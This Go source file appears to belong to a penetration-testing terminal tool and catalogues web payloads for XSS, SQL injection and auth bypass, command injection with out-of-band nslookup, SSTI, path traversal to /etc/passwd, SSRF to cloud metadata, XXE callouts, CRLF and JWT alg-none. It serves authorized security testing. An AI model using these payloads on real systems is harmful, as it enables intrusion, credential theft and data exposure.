package main

// payloadCatalog is a curated, reference-grade set of web-security payloads —
// the "copy a canonical probe, fill the canary/host, paste into your proxy"
// half of the workflow that complements the scanning tools in catalog.go.
//
// These are the same well-known probes catalogued publicly in
// PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
// and the PortSwigger Web Security Academy cheat sheets. They are deliberately
// *detection-first*: each one is meant to confirm whether a sink is reachable
// and how input is treated, not to cause damage. Fill the placeholder, press
// ctrl+y to copy, and drive the actual request from Caido/Burp against a
// target you are authorized to test. ctrl+r runs the command shown, which for
// most payloads is just an echo so the copied string survives leaving the TUI.
//
// Placeholders reuse the GTFOBins {TOKEN} mechanism (see isPlaceholder in
// tool.go): their value is substituted straight into the payload template.
//   {MARKER}  a unique canary you grep responses for (default: a random-ish tag)
//   {HOST}    your out-of-band / collaborator host for blind (OOB) detection
//   {FILE}    a file path target for traversal / LFI probes
//   {CMD}     a benign command for injection probes (default: a sleep/echo)
//
// Each payload is wrapped in `printf %s` so copying and (optionally) running it
// yields the literal string with no shell-mangling — the TUI stays a cheat
// sheet, not an exploit launcher.
func payloadEntry(name, category, desc, payload string, flags ...Flag) Tool {
	return Tool{
		Name:     name,
		Binary:   "printf '%s\\n' " + shellQuote(payload),
		Category: category,
		Desc:     desc,
		Flags:    flags,
	}
}

var (
	markerFlag = Flag{Flag: "{MARKER}", Name: "Canary", Kind: KindString, Value: "cnry7f3",
		Desc: "Unique tag to grep for in responses — confirms where your input lands"}
	hostFlag = Flag{Flag: "{HOST}", Name: "OOB host", Kind: KindString, Placeholder: "abc.oast.pro",
		Desc: "Your out-of-band collaborator host (Interactsh/Burp Collaborator) for blind detection"}
	fileFlag = Flag{Flag: "{FILE}", Name: "Target file", Kind: KindString, Value: "etc/passwd",
		Desc: "File to attempt to read via traversal (relative, no leading slash)"}
	cmdFlag = Flag{Flag: "{CMD}", Name: "Probe command", Kind: KindString, Value: "sleep 5",
		Desc: "Benign command to prove execution — a timed sleep reads cleanly as blind"}
)

var payloadCatalog = []Tool{
	// ── XSS: does my input render as markup / script? ──────────────────────
	payloadEntry("XSS · script canary", "payload · xss",
		"Canonical reflected-XSS probe; fires if input renders unescaped as HTML",
		`<script>alert('{MARKER}')</script>`, markerFlag),
	payloadEntry("XSS · img onerror", "payload · xss",
		"Event-handler vector for contexts that strip <script>",
		`<img src=x onerror=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · svg onload", "payload · xss",
		"SVG onload fires in many sanitizers that allow 'safe' tags",
		`<svg onload=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · attribute breakout", "payload · xss",
		"Breaks out of a double-quoted attribute value into a new handler",
		`"><img src=x onerror=alert('{MARKER}')>`, markerFlag),
	payloadEntry("XSS · javascript: URI", "payload · xss",
		"For sinks that reflect into href/src — classic DOM-XSS lead",
		`javascript:alert('{MARKER}')`, markerFlag),
	payloadEntry("XSS · polyglot", "payload · xss",
		"Context-spanning polyglot (0xsobky) — survives several encodings at once",
		`jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*'/*"/**/(/* */oNcliCk=alert('{MARKER}') )//`, markerFlag),
	payloadEntry("XSS · DOM hashprobe", "payload · xss",
		"Drop in the URL fragment to test client-side sinks (location.hash → innerHTML)",
		`#<img src=x onerror=alert('{MARKER}')>`, markerFlag),

	// ── SQL injection: is my input parsed as SQL? ──────────────────────────
	payloadEntry("SQLi · quote probe", "payload · sqli",
		"Single quote — the one-character test for a broken SQL string context",
		`'`),
	payloadEntry("SQLi · auth bypass", "payload · sqli",
		"Classic tautology for login forms where the query isn't parameterised",
		`' OR '1'='1' -- `),
	payloadEntry("SQLi · UNION column count", "payload · sqli",
		"Order-by ramp to find the column count before a UNION SELECT",
		`' ORDER BY 1-- `),
	payloadEntry("SQLi · UNION select", "payload · sqli",
		"UNION probe — adjust NULLs to the column count found above",
		`' UNION SELECT NULL,NULL,NULL-- `),
	payloadEntry("SQLi · boolean blind", "payload · sqli",
		"True/false pair — compare responses to confirm blind injection",
		`' AND 1=1-- `),
	payloadEntry("SQLi · time blind (MySQL)", "payload · sqli",
		"Timing oracle for fully blind contexts (MySQL/MariaDB)",
		`' AND SLEEP(5)-- `),
	payloadEntry("SQLi · time blind (Postgres)", "payload · sqli",
		"Timing oracle for PostgreSQL",
		`'; SELECT pg_sleep(5)-- `),
	payloadEntry("SQLi · time blind (MSSQL)", "payload · sqli",
		"Timing oracle for SQL Server",
		`'; WAITFOR DELAY '0:0:5'-- `),

	// ── Command injection ──────────────────────────────────────────────────
	payloadEntry("CMDi · separators", "payload · cmd-injection",
		"Shell metacharacter chain — runs {CMD} alongside the intended command",
		`; {CMD} #`, cmdFlag),
	payloadEntry("CMDi · backtick/substitution", "payload · cmd-injection",
		"Command substitution for contexts that swallow separators",
		"`{CMD}`", cmdFlag),
	payloadEntry("CMDi · blind OOB", "payload · cmd-injection",
		"Blind detection — resolves your collaborator host so a DNS hit proves exec",
		`; nslookup {MARKER}.{HOST} #`, markerFlag, hostFlag),

	// ── SSTI: server-side template injection ───────────────────────────────
	payloadEntry("SSTI · math probe", "payload · ssti",
		"Universal detector — a reflected '49' means the expression was evaluated",
		`${7*7}{{7*7}}<%= 7*7 %>`),
	payloadEntry("SSTI · Jinja2 marker", "payload · ssti",
		"Confirms Jinja2/Flask once ${7*7} hints at a template engine",
		`{{'{MARKER}'.upper()}}`, markerFlag),
	payloadEntry("SSTI · Freemarker", "payload · ssti",
		"Java/Freemarker evaluation probe",
		`${{<%[%'"}}%\`+"`"+`.`),

	// ── Path traversal / LFI ───────────────────────────────────────────────
	payloadEntry("Traversal · dot-dot-slash", "payload · path-traversal",
		"Plain ../ climb to a known file — the baseline traversal test",
		`../../../../{FILE}`, fileFlag),
	payloadEntry("Traversal · URL-encoded", "payload · path-traversal",
		"%2e%2e%2f encoding for filters that only match literal ../",
		`%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}`, fileFlag),
	payloadEntry("Traversal · double-encoded", "payload · path-traversal",
		"Double URL-encoding to slip past a single decode pass",
		`%252e%252e%252f%252e%252e%252f{FILE}`, fileFlag),
	payloadEntry("LFI · php filter wrapper", "payload · path-traversal",
		"Base64-wraps a PHP source file so it leaks instead of executing",
		`php://filter/convert.base64-encode/resource={FILE}`, fileFlag),

	// ── SSRF ───────────────────────────────────────────────────────────────
	payloadEntry("SSRF · localhost", "payload · ssrf",
		"Point a server-side fetch back at itself to reach internal-only services",
		`http://127.0.0.1/`),
	payloadEntry("SSRF · cloud metadata", "payload · ssrf",
		"IMDSv1 metadata endpoint — a hit often yields cloud credentials",
		`http://169.254.169.254/latest/meta-data/`),
	payloadEntry("SSRF · OOB canary", "payload · ssrf",
		"Blind SSRF detector — a request to your collaborator proves the fetch fired",
		`http://{MARKER}.{HOST}/`, markerFlag, hostFlag),
	payloadEntry("SSRF · decimal IP bypass", "payload · ssrf",
		"127.0.0.1 as a single decimal — slips past naive host allowlists",
		`http://2130706433/`),

	// ── Open redirect ──────────────────────────────────────────────────────
	payloadEntry("Open redirect · //host", "payload · open-redirect",
		"Protocol-relative target for redirect params that assume a local path",
		`//{HOST}/%2f..`, hostFlag),
	payloadEntry("Open redirect · @ trick", "payload · open-redirect",
		"Userinfo trick — target treated as credentials for your host",
		`https://expected-domain.com@{HOST}/`, hostFlag),

	// ── XXE ────────────────────────────────────────────────────────────────
	payloadEntry("XXE · file read", "payload · xxe",
		"External-entity probe for XML parsers — reflects a local file if vulnerable",
		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///{FILE}">]><r>&x;</r>`, fileFlag),
	payloadEntry("XXE · OOB exfil", "payload · xxe",
		"Blind XXE — forces the parser to call out to your collaborator host",
		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://{HOST}/xxe">]><r>&x;</r>`, hostFlag),

	// ── NoSQL / LDAP / CRLF / headers ──────────────────────────────────────
	payloadEntry("NoSQLi · operator inject", "payload · nosqli",
		"MongoDB operator injection for JSON auth bodies ({\"user\":{\"$ne\":null}})",
		`{"$ne": null}`),
	payloadEntry("LDAPi · wildcard", "payload · ldapi",
		"Wildcard/always-true filter for LDAP-backed login",
		`*)(uid=*))(|(uid=*`),
	payloadEntry("CRLF · header inject", "payload · crlf",
		"Encoded CR/LF to split the response and inject a header",
		`%0d%0aSet-Cookie:%20{MARKER}=1`, markerFlag),
	payloadEntry("Host header · routing", "payload · host-header",
		"Spoofed Host for password-reset poisoning and cache tricks (set as the Host header)",
		`{HOST}`, hostFlag),

	// ── Auth / tokens ──────────────────────────────────────────────────────
	payloadEntry("JWT · alg none", "payload · jwt",
		"Unsigned 'none'-algorithm header — test if the server skips signature checks",
		`{"alg":"none","typ":"JWT"}`),
}

// Wire the payload library into the main catalog without touching catalog.go's
// literal. init runs after package-level vars are initialised, so appending
// here is safe and keeps the two sets in separate files.
func init() {
	catalog = append(catalog, payloadCatalog...)
}
